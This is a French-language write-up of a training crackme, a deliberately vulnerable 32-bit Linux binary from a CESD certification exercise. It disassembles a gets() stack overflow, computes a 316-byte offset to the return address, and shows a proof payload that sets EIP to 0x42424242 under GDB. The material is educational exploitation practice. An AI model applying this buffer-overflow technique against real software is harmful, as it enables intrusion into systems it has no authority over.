# cesd_dvl_assessment_5 — zero (« 01_exploitme05 »)

- **Site** : [crackmes.one/crackme/5ab77f5333c5d40ad448c11f](https://crackmes.one/crackme/5ab77f5333c5d40ad448c11f) (réimport crackmes.de)
- **Auteur** : zero
- **Plateforme** : Unix/Linux — ELF 32-bit (Intel i386), non strippé, avec `debug_info`
- **Langage** : C (GCC, *Damn Vulnerable Linux*)
- **Difficulté** : 2.0 · **Qualité** : 4.0
- **Publié** : 2018-03-25 (réimport) — exercice de la certification CESD

> *Practical Assessment 05* de la certification **CESD** (IITAC). Comme les
> précédents, ce n'est pas un keygen : l'objectif est d'exploiter un débordement
> de tampon, ici via le `gets()` sur un buffer de pile, avec l'entrée lue sur
> **stdin**. Le programme affiche même l'adresse du buffer (`%p`) pour aider à
> placer un shellcode.

## Le binaire

Le ZIP contient `01_exploitme05` (l'ELF) et le workbook `IITAC_CESD_Exercises.pdf`.

SHA-256 de l'ELF extrait : `ac80f066f55375cd03af20d5207bd062cb6a5fd649a70134e2eaccdfdf75bdc3`.

## Comment on trouve

`main` ne fait qu'appeler `exploit_me()`. Tout est là :

```asm
080483c4 <exploit_me>:
 80483c4: push   ebp
 80483c5: mov    ebp,esp
 80483c7: sub    esp,0x148
 80483cd: lea    eax,[ebp-0x138]          ; &buf
 80483d3: mov    [esp+0x4],eax
 80483d7: mov    [esp],0x8048544          ; "Return address must be %p\n"
 80483de: call   printf@plt               ; affiche &buf (indice shellcode)
 80483e3: lea    eax,[ebp-0x138]          ; &buf
 80483e9: mov    [esp],eax
 80483ec: call   gets@plt                 ; gets(buf) ← AUCUN contrôle
 80483f1: lea    eax,[ebp-0x138]
 ...      printf("%s\n", buf)
 8048407: leave
 8048408: ret
```

`gets(buf)` avec `buf = [ebp-0x138]` lit une ligne entière depuis stdin sans
limite : débordement de pile direct.

### Offset jusqu'à l'adresse de retour

- `buf` commence à `ebp-0x138`.
- `ebp` sauvegardé à `ebp+0`, adresse de retour à `ebp+4`.
- Distance `buf → ret` : `0x138 + 4 = 0x13c = 316` octets.

Les octets **316..319** de l'entrée écrasent l'adresse de retour (futur EIP au
`ret` de `exploit_me`). L'entrée passe par **stdin**, pas par `argv`.

### Payload

```
"A" * 316  +  <adresse sur 4 octets little-endian>
```

Avec `"BBBB"` (= `0x42424242`) pour la preuve de contrôle d'EIP.

## Vérification

```
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*316+b"BBBB\n")' | ./01_exploitme05
Return address must be 0xff...
Segmentation fault
```

### Debug GDB

EIP vaut exactement `0x42424242` au crash :

```
$ gdb -q ./01_exploitme05
(gdb) run < payload.bin        # payload.bin = "A"*316 + "BBBB" + "\n"

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info registers eip
eip            0x42424242          0x42424242
```

## Solveur

[`tools/crackmes-de-cesd_dvl_assessment_5-solve.py`](tools/crackmes-de-cesd_dvl_assessment_5-solve.py) :

```
$ ./tools/crackmes-de-cesd_dvl_assessment_5-solve.py
vuln              : gets(buf), buf=[ebp-0x138]
offset EIP        : 316
EIP cible         : 0x42424242
payload (len=321) : b'AAAAAAAAAAAAAAAA'...b'BBBB\n'

$ ./tools/crackmes-de-cesd_dvl_assessment_5-solve.py --gdb
eip            0x42424242          0x42424242
EIP controle : OUI
```

Le script envoie le payload sur stdin (`--run`) ou le vérifie sous GDB
(`--gdb`), sans toucher à `original/`.

## Réponse

| | |
|---|---|
| Vulnérabilité | `gets(buf)` dans `exploit_me`, `buf=[ebp-0x138]`, entrée stdin |
| Offset vers l'adresse de retour | **316 octets** (`0x138 + 4`) |
| Payload de preuve | `"A"*316 + "BBBB"` → EIP = `0x42424242` |

Exemple (`petik`) : `python3 -c 'import sys;sys.stdout.buffer.write(b"A"*316+b"BBBB\n")' | ./01_exploitme05` plante avec EIP contrôlé.
